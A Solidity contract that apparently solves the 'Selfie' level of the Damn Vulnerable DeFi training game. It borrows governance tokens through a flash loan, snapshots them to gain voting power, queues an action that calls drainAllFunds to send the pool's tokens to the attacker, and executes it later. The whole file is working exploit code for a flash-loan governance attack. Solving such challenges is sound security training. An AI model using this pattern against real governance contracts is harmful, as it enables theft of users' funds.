// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableTokenSnapshot.sol";

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;

    function drainAllFunds(address receiver) external;
}

interface ISimpleGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(uint256 actionId) external payable;
}

contract SelfieAttack {
    using Address for address;

    ISimpleGovernance public immutable gov;
    ISelfiePool public immutable pool;
    address payable public owner;
    uint256 actionId;

    constructor(address govAddress, address trusterAddress) {
        gov = ISimpleGovernance(govAddress);
        pool = ISelfiePool(trusterAddress);
        owner = payable(msg.sender);
    }

    function attack(uint256 borrowAmount) external {
        pool.flashLoan(borrowAmount);
    }

    function receiveTokens(address tokenAddress, uint256 amount) external {
        DamnValuableTokenSnapshot(tokenAddress).snapshot();
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            owner
        );
        actionId = gov.queueAction(address(pool), data, 0);
        IERC20(tokenAddress).transfer(address(pool), amount);
    }

    function execute() external {
        gov.executeAction(actionId);
    }
}
